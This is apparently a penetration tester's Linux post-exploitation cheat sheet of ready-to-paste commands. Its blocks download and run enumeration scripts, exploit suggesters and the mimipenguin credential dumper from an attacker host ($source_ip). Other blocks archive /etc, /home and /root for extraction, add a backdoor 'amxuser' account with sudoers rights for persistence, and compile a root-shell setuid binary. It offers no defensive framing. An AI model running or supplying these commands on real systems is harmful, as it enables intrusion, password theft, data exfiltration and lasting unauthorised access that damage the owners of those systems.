
# Linux

## Enumeration Scripts
```
wget http://$source_ip/tools_linux/lse.sh; bash lse.sh | tee lse.sh.out
```
```
wget http://$source_ip/tools_linux/LinEnum.sh; bash LinEnum.sh | tee LinEnum.sh.out
```
```
wget http://$source_ip/tools_linux/linpeas.sh; bash linpeas.sh | tee linpeas.sh.out
```
```
wget http://$source_ip/tools_linux/linuxprivchecker.py; python linuxprivchecker.py | tee linuxprivchecker.py.out
```
```
wget http://$source_ip/tools_linux/linux-local-enum.sh; bash linux-local-enum.sh | tee linux-local-enum.sh.out
```
```
wget http://$source_ip/tools_linux/unix-privesc-check.sh; bash unix-privesc-check.sh | tee unix-privesc-check.sh.out
```
```
wget http://$source_ip/tools_linux/linux_security_test.sh; bash linux_security_test.sh | tee linux_security_test.sh.out
```
```
wget http://$source_ip/tools_linux/checksec; bash checksec --kernel | tee checksec.kernel.out
```
```
wget http://$source_ip/tools_linux/checksec; bash checksec --fortify-proc=1 | tee checksec.proc.out
```

## Process monitoring
```
wget http://$source_ip/tools_linux/pspy32; pspy32
```
```
wget http://$source_ip/tools_linux/pspy64; pspy64
```

## Exploit Suggesters
```
wget http://$source_ip/tools_linux/linux_kernel_exploiter.pl; perl linux_kernel_exploiter.pl | tee linux_kernel_exploiter.pl.out
```
```
wget http://$source_ip/tools_linux/Linux_Exploit_Suggester.pl; perl Linux_Exploit_Suggester.pl | tee Linux_Exploit_Suggester.pl.out
```
```
wget http://$source_ip/tools_linux/linux-exploit-suggester-2.pl; perl linux-exploit-suggester-2.pl | tee linux-exploit-suggester-2.pl.out
```
```
wget http://$source_ip/tools_linux/linux-exploit-suggester.sh; bash linux-exploit-suggester.sh | tee linux-exploit-suggester.sh.out
```

## Data Extraction
```
ifconfig -a; netstat -antp; arp -e; route -v; route -vn
```
```
tar -zcf linux_files.tar.gz /etc/* /home/* /root/* /var/www/* /var/log/*
```

## Password Dumping
```
wget http://$source_ip/tools_linux/mimipenguin_2.0/mimipenguin.py; python mimipenguin.py | tee mimipenguin.py.out
```
```
wget http://$source_ip/tools_linux/mimipenguin_2.0/mimipenguin.sh; bash mimipenguin.sh | tee mimipenguin.sh.out
```

## Persistance
```
sudo echo "amxuser ALL=(ALL) ALL" >> /etc/sudoers
```
```
/usr/sbin/useradd -p 'openssl passwd -1 amxpass' amxuser 
```
```
echo amxpass | passwd amxuser --stdin
```

## Exploit 
```
echo "int main(void){\nsetgid(0);\nsetuid(0);\nsystem(\"/bin/sh\");\n}" >privsc.c; gcc privsc.c -o privsc
```